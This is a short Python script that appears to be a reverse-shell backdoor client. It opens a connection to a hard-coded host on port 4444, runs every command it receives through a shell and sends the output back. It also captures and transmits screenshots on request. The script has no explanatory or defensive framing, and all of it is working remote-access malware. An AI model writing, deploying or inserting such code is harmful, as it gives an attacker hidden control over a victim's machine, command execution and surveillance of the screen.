import socket
import subprocess
import pyautogui
import io

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.200.27", 4444))
    
    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == "exit":
            break

        if command.lower() == "screenshot":
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            client_socket.send(b"SCREENSHOT" + img_byte_arr.getvalue())
        else:
            output = subprocess.getoutput(command)
            if len(output) == 0:
                output = "Command executed."
            client_socket.send(output.encode())

    client_socket.close()

if __name__ == "__main__":
    connect_to_server()
